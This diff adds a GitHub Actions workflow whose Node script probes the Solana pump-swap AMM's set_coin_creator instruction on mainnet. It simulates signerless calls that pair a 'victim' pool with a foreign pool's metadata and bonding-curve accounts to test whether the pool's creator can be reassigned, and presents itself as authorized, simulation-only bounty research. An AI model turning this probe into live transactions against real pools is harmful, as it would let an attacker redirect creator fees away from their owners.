@@ -1,0 +1,54 @@
+name: set-coin-creator-runtime-differential
+
+on:
+  push:
+    paths:
+      - '.github/workflows/set-coin-creator-runtime-differential.yml'
+  workflow_dispatch:
+
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 6
+    steps:
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 24
+      - run: npm install --no-save @pump-fun/pump-swap-sdk@1.19.0 @solana/web3.js
+      - name: Simulation-only signerless creator-sync cross-pool differential
+        shell: bash
+        run: |
+          node --input-type=module <<'NODE'
+          import fs from 'node:fs';
+          import {PublicKey,TransactionInstruction,TransactionMessage,VersionedTransaction} from '@solana/web3.js';
+          import * as a from '@pump-fun/pump-swap-sdk';
+
+          const RPC='https://api.mainnet-beta.solana.com';
+          const AMM=new PublicKey('pAMMBay6oceH9fJKBRHGP5D4bD4sWpmSwMn52FMfXEA');
+          const PUMP=new PublicKey('6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P');
+          const META=new PublicKey('metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s');
+          const PAYER=new PublicKey('Gygj9QQby4j2jryqyqBHvLP7ctv2SaANgh4sCb69BUpA');
+          const VICTIM=new PublicKey('2AZvfjn3Hre5mM47bRv6VnKRX36wSDW6vrkC5ykK3X7T');
+          const FOREIGN=new PublicKey('3KFN45igGN2vJ86UTgB4RMJt3A68PHzuvLA6qQ3i7dQ5');
+          const online=new a.OnlinePumpAmmSdk({getAccountInfo:()=>{throw Error('unused')}});
+          let id=1;async function rpc(method,params){const ctl=new AbortController(),timer=setTimeout(()=>ctl.abort(),12000);try{const r=await fetch(RPC,{method:'POST',signal:ctl.signal,headers:{'content-type':'application/json','user-agent':'pump-authorized-bounty-simulation-only-set-coin-creator/1.0'},body:JSON.stringify({jsonrpc:'2.0',id:id++,method,params})});if(!r.ok)throw Error('HTTP '+r.status);const j=await r.json();if(j.error)throw Error(JSON.stringify(j.error));return j.result}finally{clearTimeout(timer)}}
+          const idl=JSON.parse(fs.readFileSync('node_modules/@pump-fun/pump-swap-sdk/src/idl/pump_amm.json','utf8')),def=idl.instructions.find(x=>x.name==='set_coin_creator');console.log('IDL',JSON.stringify(def,null,2));for(const e of idl.errors??[])if(/creator|metadata|bonding|pool|mayhem|sharing/i.test((e.name??'')+' '+(e.msg??'')))console.log('ERR',e.code,e.name,e.msg);
+          const raw=(await rpc('getMultipleAccounts',[[VICTIM.toBase58(),FOREIGN.toBase58()],{encoding:'base64',commitment:'confirmed'}])).value;
+          const info=x=>({data:Buffer.from(x.data[0],'base64'),lamports:x.lamports,owner:new PublicKey(x.owner),executable:x.executable,rentEpoch:x.rentEpoch??0});
+          const vp=a.PUMP_AMM_SDK.decodePool(info(raw[0])),fp=a.PUMP_AMM_SDK.decodePool(info(raw[1]));
+          const metaPda=m=>PublicKey.findProgramAddressSync([Buffer.from('metadata'),META.toBuffer(),m.toBuffer()],META)[0];
+          const curve=m=>PublicKey.findProgramAddressSync([Buffer.from('bonding-curve'),m.toBuffer()],PUMP)[0];
+          const event=PublicKey.findProgramAddressSync([Buffer.from('__event_authority')],AMM)[0];
+          const V_META=metaPda(vp.baseMint),F_META=metaPda(fp.baseMint),V_CURVE=curve(vp.baseMint),F_CURVE=curve(fp.baseMint);
+          const aux=(await rpc('getMultipleAccounts',[[V_META.toBase58(),F_META.toBase58(),V_CURVE.toBase58(),F_CURVE.toBase58()],{encoding:'base64',commitment:'confirmed'}])).value;
+          const safe=v=>{if(v==null)return v;if(v?.toBase58)return v.toBase58();if(v?.constructor?.name==='BN')return v.toString();if(Array.isArray(v))return v.map(safe);if(typeof v==='object'){const o={};for(const [k,z] of Object.entries(v))o[k]=safe(z);return o}return v};
+          console.log('CONTEXT',JSON.stringify({victimPool:VICTIM.toBase58(),victim:safe(vp),foreignPool:FOREIGN.toBase58(),foreign:safe(fp),victimMetadata:V_META.toBase58(),victimMetadataExists:!!aux[0],foreignMetadata:F_META.toBase58(),foreignMetadataExists:!!aux[1],victimCurve:V_CURVE.toBase58(),victimCurveExists:!!aux[2],foreignCurve:F_CURVE.toBase58(),foreignCurveExists:!!aux[3],event:event.toBase58()},null,2));
+          const disc=Buffer.from(def.discriminator);
+          function ix(pool,metadata,bonding){return new TransactionInstruction({programId:AMM,data:disc,keys:[{pubkey:pool,isSigner:false,isWritable:true},{pubkey:metadata,isSigner:false,isWritable:false},{pubkey:bonding,isSigner:false,isWritable:false},{pubkey:event,isSigner:false,isWritable:false},{pubkey:AMM,isSigner:false,isWritable:false}]})}
+          function parse(logs){const xs=logs??[],t=xs.join('\n');return {code:t.match(/Error Code: ([A-Za-z0-9_]+)/)?.[1]??null,num:Number(t.match(/Error Number: (\d+)/)?.[1]??0)||null,account:t.match(/AnchorError caused by account: ([A-Za-z0-9_\-]+)/)?.[1]??null,interesting:xs.filter(x=>/Instruction:|AnchorError|Error Code|Error Number|creator|metadata|bonding|pool|mayhem|sharing|failed|success/i.test(x)).slice(-120)}}
+          async function sim(label,inst){const bh=(await rpc('getLatestBlockhash',[{commitment:'processed'}])).value.blockhash,tx=new VersionedTransaction(new TransactionMessage({payerKey:PAYER,recentBlockhash:bh,instructions:[inst]}).compileToV0Message()),ser=Buffer.from(tx.serialize()).toString('base64');const v=(await rpc('simulateTransaction',[ser,{encoding:'base64',sigVerify:false,replaceRecentBlockhash:true,commitment:'processed',accounts:{encoding:'base64',addresses:[VICTIM.toBase58()]}}])).value,e=parse(v.logs);let post=null;const rr=v.accounts?.[0];if(rr?.data?.[0])try{post=a.PUMP_AMM_SDK.decodePool(info(rr))}catch(x){post={decodeError:String(x)}}console.log('\nSIM',label,JSON.stringify({err:v.err,units:v.unitsConsumed,code:e.code,num:e.num,account:e.account,post:safe(post),interesting:e.interesting},null,2));return {v,e,post}}
+          await sim('CONTROL_VICTIM_METADATA_VICTIM_CURVE',ix(VICTIM,V_META,V_CURVE));
+          await sim('CROSS_FOREIGN_METADATA_FOREIGN_CURVE',ix(VICTIM,F_META,F_CURVE));
+          await sim('CROSS_FOREIGN_METADATA_ONLY',ix(VICTIM,F_META,V_CURVE));
+          await sim('CROSS_FOREIGN_CURVE_ONLY',ix(VICTIM,V_META,F_CURVE));
+          NODE
